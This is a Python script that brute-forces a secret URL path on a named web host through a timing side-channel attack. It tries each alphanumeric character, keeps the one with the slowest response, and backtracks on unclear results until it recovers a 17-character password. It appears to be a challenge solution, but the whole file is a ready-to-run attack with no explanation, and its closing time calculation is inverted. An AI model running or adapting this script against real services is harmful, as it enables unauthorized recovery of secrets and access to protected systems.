import requests
from time import time
import operator
import itertools

url = 'http://osmlist.pythonanywhere.com/secret/' 

options = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

correct_pass = ""
count = 0

start_all = time()

while (len(correct_pass) != 17):
    d = {}
    for i in range(len(options)):
        guess = f"{correct_pass}{options[i]}{'a' * (16 - len(correct_pass))}"
        start = time()
        (requests.get(url+guess).text)
        d[options[i]] = float(f"{time() - start:.4}")

    largest,seconds_largest = sorted(d.values(),reverse= True)[:2]
    
    if largest - 0.2 > seconds_largest:
        count = 0
        correct_pass += max(d.items(), key=operator.itemgetter(1))[0]
        print(d)
        print()
        print(correct_pass)
        print()
    else:
        print(d)
        print("not conclusive")
        if count == 2:
            count = 0
            print("Backtracking")
            correct_pass = correct_pass[:-1]
        else:
            count += 1

print(f"The password is {correct_pass}, and the entire encryption took {((start_all - time()) / 60)} minutes.")
